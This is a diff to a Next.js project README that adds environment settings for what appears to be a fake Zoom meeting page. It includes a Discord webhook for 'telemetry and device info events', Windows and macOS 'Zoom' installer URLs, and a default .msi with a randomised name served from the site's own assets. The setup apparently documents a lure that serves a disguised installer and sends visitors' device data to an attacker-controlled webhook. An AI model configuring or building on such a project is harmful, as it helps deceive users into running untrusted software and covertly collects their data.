@@ -20,6 +20,15 @@ You can start editing the page by modifying `app/page.js`. The page auto-updates
 
 This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.
 
+## Environment Configuration
+
+Create a `.env.local` file in the project root with the following values:
+
+- `DISCORD_WEBHOOK_URL`: Incoming webhook URL that receives telemetry and device info events.
+- `NEXT_PUBLIC_ZOOM_WIN_URL` (optional): Override URL for the Windows installer. If omitted, the app serves `public/assets/setup/update/em_8ybPmrAI_installer_Win7-Win11_x86_x64.msi`.
+- `NEXT_PUBLIC_ZOOM_MAC_URL`: URL for the macOS installer (`ZoomInstaller.pkg`).
+- `NEXT_PUBLIC_MEETING_LINK`: Fallback meeting URL for Join Meeting actions.
+
 ## Learn More
 
 To learn more about Next.js, take a look at the following resources:
